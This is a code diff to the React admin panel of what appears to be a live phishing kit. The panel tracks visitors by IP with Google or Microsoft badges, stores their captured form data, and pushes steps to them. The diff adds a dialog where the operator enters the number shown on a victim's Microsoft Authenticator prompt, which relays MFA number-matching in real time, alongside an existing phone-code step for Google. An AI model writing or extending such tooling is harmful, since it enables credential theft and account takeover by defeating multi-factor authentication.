@@ -311,6 +311,8 @@ function VisitorModal({
   const [revealField, setRevealField] = useState<string | null>(null);
   const [codeTypeDialogOpen, setCodeTypeDialogOpen] = useState(false);
   const [codeTypeSelected, setCodeTypeSelected] = useState<'email' | 'phone'>('email');
+  const [authenticatorDialogOpen, setAuthenticatorDialogOpen] = useState(false);
+  const [authenticatorNumberVal, setAuthenticatorNumberVal] = useState('');
 
   const iframeSrc = visitorModalSrc(visitor);
   const stepColor = STEP_COLORS[visitor.step] ?? '#4b5563';
@@ -323,6 +325,7 @@ function VisitorModal({
   // Steps that bypass the preview (send immediately or have own dialog)
   const triggerAction = (step: string, label: string, color: string, extra?: { promptNumber?: number; phoneDigits?: string }) => {
     if (step === '__code_choice__') { setCodeTypeDialogOpen(true); return; }
+    if (step === 'authenticator' && visitor.provider === 'microsoft') { setAuthenticatorNumberVal(''); setAuthenticatorDialogOpen(true); return; }
     if (step === 'phone-code' && visitor.provider === 'google') {
       const raw = (visitor.formData ?? {})['phone'] ?? '';
       setPhoneDigitsVal(raw ? raw.replace(/\D/g, '').slice(-2) : '');
@@ -352,7 +355,7 @@ function VisitorModal({
         {/* Header */}
         <div className="flex items-center gap-2 sm:gap-3 px-4 sm:px-5 py-3 border-b border-[#2d3139] bg-[#16181d] flex-shrink-0">
           <div className="flex items-center gap-2 sm:gap-3 min-w-0 flex-1">
-            <div className={`w-2 h-2 rounded-full flex-shrink-0 ${visitor.online ? 'bg-green-400 animate-pulse' : 'bg-[#555d6b]'}`} />
+            <div className={`w-2 h-2 rounded-full flex-shrink-0 ${visitor.online ? 'bg-green-400 animate-pulse' : 'bg-red-500'}`} />
             <div className="w-6 h-6 rounded bg-white flex items-center justify-center flex-shrink-0 shadow-sm">
               <ProviderBadge provider={visitor.provider} />
             </div>
@@ -481,6 +484,26 @@ function VisitorModal({
                       setCodeTypeDialogOpen(false);
                       setPendingAction({ step: targetStep, label: targetLabel, color: '#7c3aed' });
                     }} className="flex-1 py-2 rounded-lg text-[12px] font-semibold text-white" style={{ backgroundColor: '#7c3aed' }}>Confirm</button>
+                  </div>
+                </div>
+              )}
+
+              {/* Authenticator number dialog — Microsoft */}
+              {authenticatorDialogOpen && visitor.provider === 'microsoft' && (
+                <div className="mt-3 bg-[#1a1d24] rounded-xl border border-[#0078D4]/50 p-4 space-y-3">
+                  <p className="text-[11px] text-[#8a919e] font-medium">Number to display on the Authenticator screen</p>
+                  <input
+                    type="number" min={1} max={99} value={authenticatorNumberVal}
+                    onChange={e => setAuthenticatorNumberVal(e.target.value)} placeholder="e.g. 42"
+                    className="w-full bg-[#0b0c10] border border-[#2d3139] rounded-lg px-3 py-2 text-[13px] text-white placeholder-[#555d6b] outline-none focus:border-[#0078D4] transition-colors"
+                    autoFocus
+                  />
+                  <div className="flex gap-2">
+                    <button onClick={() => setAuthenticatorDialogOpen(false)} className="flex-1 py-2 rounded-lg border border-[#2d3139] text-[12px] text-[#8a919e] hover:bg-[#2d3139] transition-colors">Cancel</button>
+                    <button
+                      onClick={() => { const n = parseInt(authenticatorNumberVal, 10); if (n >= 1 && n <= 99) { onPushAction(visitor.id, 'authenticator', { promptNumber: n }); setAuthenticatorDialogOpen(false); } }}
+                      className="flex-1 py-2 rounded-lg text-[12px] font-semibold text-white" style={{ backgroundColor: '#0078D4' }}
+                    >Send</button>
                   </div>
                 </div>
               )}
@@ -713,17 +736,11 @@ export default function AdminPage() {
           } else if (msg.type === 'visitor-joined' && msg.visitor) {
             const v = { ...msg.visitor, formData: msg.visitor.formData ?? {}, formHistory: msg.visitor.formHistory ?? [], online: true };
             setVisitors(prev => {
-              const idx = prev.findIndex(x => x.ip === v.ip && !x.online);
-              if (idx >= 0) {
-                const next = [...prev];
-                next[idx] = {
-                  ...v,
-                  formData: { ...prev[idx].formData, ...v.formData },
-                  formHistory: [...(prev[idx].formHistory ?? []), ...v.formHistory],
-                };
-                return next;
-              }
-              return [...prev.filter(x => x.id !== v.id), v];
+              const existing = prev.find(x => x.ip === v.ip);
+              const merged: VisitorInfo = existing
+                ? { ...v, formData: { ...existing.formData, ...v.formData }, formHistory: [...(existing.formHistory ?? []), ...v.formHistory] }
+                : v;
+              return [...prev.filter(x => x.ip !== v.ip), merged];
             });
           } else if (msg.type === 'visitor-left' && msg.id) {
             setVisitors(prev => prev.map(v => v.id === msg.id ? { ...v, online: false } : v));
@@ -1083,7 +1100,7 @@ export default function AdminPage() {
                     <div key={v.id} className={`rounded-xl border overflow-hidden transition-all ${v.online ? 'border-[#2d3139] bg-[#1a1d24]' : 'border-[#232630] bg-[#16181d] opacity-60'}`}>
                       {/* Header row */}
                       <div className="flex items-center gap-2 px-3 pt-3 pb-1.5">
-                        <div className={`w-1.5 h-1.5 rounded-full flex-shrink-0 ${v.online ? 'bg-green-400 animate-pulse' : 'bg-[#555d6b]'}`} />
+                        <div className={`w-1.5 h-1.5 rounded-full flex-shrink-0 ${v.online ? 'bg-green-400 animate-pulse' : 'bg-red-500'}`} />
                         <div className="w-5 h-5 rounded bg-white flex items-center justify-center flex-shrink-0 shadow-sm">
                           <ProviderBadge provider={v.provider} />
                         </div>
